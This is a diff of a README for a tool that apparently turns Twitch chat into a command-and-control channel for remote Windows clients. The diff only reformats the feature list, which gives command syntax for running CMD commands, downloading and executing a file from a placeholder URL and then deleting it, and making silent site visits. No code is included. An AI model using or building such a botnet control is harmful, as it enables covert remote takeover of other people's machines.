@@ -12,11 +12,17 @@ The usage of this program directly violates the Twitch Developer Agreement. The 
 This program was created as a Proof of Concept and it is not intended to be used in a malicious way. I am not responsible for any damages or criminal charges that come from using it.
 
 # Features
-`cmd` Windows CMD commands. Structured as `!act client cmd commandhere true`
+`cmd` 
 
-`de` Download and execute. File is removed after execution. Structured as `!act client de https://www.yoururlhere.com/file.exe true`
+Windows CMD commands. Structured as `!act client cmd commandhere true`
 
-`visit` Silent site visit. Returns the site response after a successful execution. Structured as `!act client visit https://www.yoururlhere.com/ true`
+`de` 
+
+Download and execute. File is removed after execution. Structured as `!act client de https://www.yoururlhere.com/file.exe true`
+
+`visit` 
+
+Silent site visit. Returns the site response after a successful execution. Structured as `!act client visit https://www.yoururlhere.com/ true`
 
 # Usage
 Navigate to the twitch page of the channel you selected when making the program.
